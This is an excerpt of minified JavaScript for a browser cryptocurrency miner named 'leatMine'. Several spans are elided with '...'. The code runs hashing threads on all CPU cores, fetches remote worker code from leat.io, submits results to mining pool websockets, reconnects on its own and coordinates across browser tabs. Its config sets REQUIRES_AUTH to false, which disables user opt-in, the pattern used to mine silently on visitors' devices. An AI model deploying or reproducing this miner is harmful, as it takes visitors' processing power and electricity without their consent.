!function(e) {
  ...
  var t = function(t, r) {
    ...
    this._goal = 0,
    this._total_HashesFromDeadThreads = 0,
    this._throttle = Math.max(0, Math.min(.99, this.params.throttle || 0)),
    this._stopOnInvalidOptIn = !1,
    this._waitingForAuth = !1,
    this._autoThreads = {
    ...
    this._tab = {
      ...
      mode: leatMine.IF_EXCLUSIVE_TAB,
      grace: 0,
      lastPingReceived: 0,
      interval: null
    },
    ...
    leatMine.CONFIG.REQUIRES_AUTH && (this._auth = new leatMine.Auth(this._siteKey,{
    ...
    this._targetNumThreads = this.params.threads || navigator.hardwareConcurrency || 4,
  ...
  t.prototype.start = function(t, r) {
    if (this._tab.mode = t || leatMine.IF_EXCLUSIVE_TAB,
    this._optInToken = r,
    this._tab.interval && (clearInterval(this._tab.interval),
    this._tab.interval = null),
    this._useWASM || "loaded" === this._asmjsStatus)
      this._startNow();
    else if ("unloaded" === this._asmjsStatus) {
      this._asmjsStatus = "pending";
      var n = new XMLHttpRequest;
      n.addEventListener("load", function() {
        leatMine.LEATHASH_WORKER_BLOB = e.URL.createObjectURL(new Blob([n.responseText])),
        this._asmjsStatus = "loaded",
        this._startNow()
      }
      .bind(this), n),
      n.open("get", leatMine.CONFIG.LIB_URL + leatMine.CONFIG.ASMJS_NAME, !0),
      n.send()
    }
  }
  ,
  t.prototype.stop = function(e) {
    for (var t = 0; t < this._threads.length; t++)
      this._total_HashesFromDeadThreads += this._threads[t].hashesTotal,
      this._threads[t].stop();
    this._threads = [],
    this._autoReconnect = !1,
    this._socket && this._socket.close(),
    this._currentJob = null,
    this._autoThreads.interval && (clearInterval(this._autoThreads.interval),
    this._autoThreads.interval = null),
    this._tab.interval && "dont_KillTabUpdate" !== e && (clearInterval(this._tab.interval),
    this._tab.interval = null)
  }
  ,
  t.prototype.getHashesPerSecond = function() {
    for (var e = 0, t = 0; t < this._threads.length; t++)
      e += this._threads[t].hashesPerSecond;
    return e
  }
  ,
  t.prototype.getTotalHashes = function(e) {
    for (var t = Date.now(), r = this._total_HashesFromDeadThreads, n = 0; n < this._threads.length; n++) {
      var o = this._threads[n];
      if (r += o.hashesTotal,
      e) {
        r += (t - o.lastMessageTimestamp) / 1e3 * .9 * o.hashesPerSecond
      }
    }
    return 0 | r
  }
  ,
  t.prototype.getAcceptedHashes = function() {
    return this._hashes
  }
  ,
  ...
  ,
  t.prototype.getAutoThreadsEnabled = function(e) {
    return this._autoThreads.enabled
  }
  ,
  t.prototype.setAutoThreadsEnabled = function(e) {
    this._autoThreads.enabled = !!e,
    !e && this._autoThreads.interval && (clearInterval(this._autoThreads.interval),
    this._autoThreads.interval = null),
    e && !this._autoThreads.interval && (this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery,
    this._autoThreads.interval = setInterval(this._adjustThreads.bind(this), 100))
  }
  ,
  t.prototype.getThrottle = function() {
    return this._throttle
  }
  ,
  t.prototype.setThrottle = function(e) {
    this._throttle = Math.max(0, Math.min(.99, e)),
    this._currentJob && this._setJob(this._currentJob)
  }
  ,
  t.prototype.getNumThreads = function() {
    return this._targetNumThreads
  }
  ,
  t.prototype.setNumThreads = function(e) {
    e = Math.max(1, 0 | e);
    if (this._targetNumThreads = e,
    e > this._threads.length)
      for (var t = 0; e > this._threads.length; t++) {
        var r = new leatMine.JobThread;
        this._currentJob && r.setJob(this._currentJob, this._onTargetMetBound),
        this._threads.push(r)
      }
    else if (e < this._threads.length)
      for (; e < this._threads.length; ) {
        r = this._threads.pop();
        this._total_HashesFromDeadThreads += r.hashesTotal,
        r.stop()
      }
  }
  ,
  t.prototype.hasWASMSupport = function() {
  ...
  ,
  t.prototype.didOptOut = function(e) {
    if (!leatMine.CONFIG.REQUIRES_AUTH)
      return !1;
    e = e || 14400;
    var t = this._auth.getOptOutTime();
    return !!(t && t > Date.now() / 1e3 - e)
  }
  ,
  t.prototype._startNow = function() {
    this._tab.mode === leatMine.FORCE_MULTI_TAB || this._tab.interval || (this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)),
    this._tab.mode === leatMine.IF_EXCLUSIVE_TAB && this._otherTabRunning() || (this._tab.mode === leatMine.FORCE_EXCLUSIVE_TAB && (this._tab.grace = Date.now() + 3e3),
    this.verifyThread || (this.verifyThread = new leatMine.JobThread),
    this.setNumThreads(this._targetNumThreads),
    this._autoReconnect = !0,
    leatMine.CONFIG.REQUIRES_AUTH && !this._optInToken ? (this._waitingForAuth = !0,
    this._auth.auth(function(e) {
      if (this._waitingForAuth = !1,
      !e)
        return this.stop(),
        this._emit("optin", {
          status: "canceled"
        }),
        void this._emit("error", {
    ...
    .bind(this))) : this._connect())
  }
  ,
  t.prototype._otherTabRunning = function() {
    if (this._tab.lastPingReceived > Date.now() - 1500)
      return !0;
    try {
      var e = localStorage.getItem("leatmine");
      if (e) {
        var t = JSON.parse(e);
  ...
  t.prototype._updateTabs = function() {
    ...
    if (e && this.isRunning() && Date.now() > this._tab.grace ? this.stop("dont_KillTabUpdate") : e || this.isRunning() || this._startNow(),
    this.isRunning() && !this._waitingForAuth) {
  ...
  ,
  t.prototype._hashString = function(e) {
  ...
  t.prototype._connect = function() {
    if (!this._socket) {
      var e = leatMine.CONFIG.WEBSOCKET_SHARDS
        , t = e[this._hashString(this._siteKey) % e.length]
        , r = t[Math.random() * t.length | 0];
      this._socket = new WebSocket(r),
  ...
  ,
  t.prototype._onOpen = function(e) {
    this._emit("open");
    var t = {
    ...
    this._user ? (t.type = "user",
    t.user = this._user.toString()) : this._goal && (t.type = "token",
    t.goal = this._goal),
    this._optInToken && (t.opt_in = this._optInToken),
    this._send("auth", t)
  }
  ,
  ...
  t.prototype._onClose = function(e) {
    e.code >= 1003 && e.code <= 1009 && (this._reconnectRetry = 60);
    for (var t = 0; t < this._threads.length; t++)
      this._threads[t].stop();
    this._threads = [],
    this._socket = null,
  ...
  ,
  t.prototype._onTargetMet = function(e) {
    this._emit("found", e),
    e.job_id === this._currentJob.job_id && this._send("submit", {
      job_id: e.job_id,
      nonce: e.nonce,
      result: e.result
    })
  ...
  ,
  t.prototype._onVerified = function(e) {
  ...
  ,
  e.leatMine = e.leatMine || {},
  e.leatMine.IF_EXCLUSIVE_TAB = "ifExclusiveTab",
  e.leatMine.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab",
  e.leatMine.FORCE_MULTI_TAB = "forceMultiTab",
  e.leatMine.Token = function(e, r, n) {
    var o = new t(e,n);
    return o._goal = r || 0,
    o
  }
  ,
  e.leatMine.User = function(e, r, n) {
    var o = new t(e,n);
    return o._user = r,
    o
  }
  ,
  e.leatMine.Anonymous = function(e, r) {
    return new t(e,r)
  }
  ,
  e.leatMine.createBlob = function(d) {
    var url = e.URL || e.webkitURL || e.mozURL;
...
function(e) {
  "use strict";
  var t = function() {
    this.worker = new Worker(leatMine.LEATHASH_WORKER_BLOB),
  ...
  t.prototype.onReady = function(e) {
    ...
    this.currentJob && (this.running = !0,
    this.worker.postMessage(this.currentJob))
  }
  ,
  t.prototype.onReceiveMsg = function(e) {
    e.data.verify_id ? this.verifyCallback(e.data) : (e.data.result && this.jobCallback(e.data),
    this.hashesPerSecond = .5 * this.hashesPerSecond + .5 * e.data.hashesPerSecond,
  ...
  t.prototype.setJob = function(e, t) {
    this.currentJob = e,
    this.jobCallback = t,
    this._isReady && !this.running && (this.running = !0,
    this.worker.postMessage(this.currentJob))
  }
  ,
  t.prototype.verify = function(e, t) {
    this._isReady && (this.verifyCallback = t,
  ...
  ,
  e.leatMine.JobThread = t
}(window),
window.leatMine.CONFIG = {
  LIB_URL: "https://leat.io/lib/",
  ASMJS_NAME: "leathanhash-asmjs.min.js",
  REQUIRES_AUTH: !1,
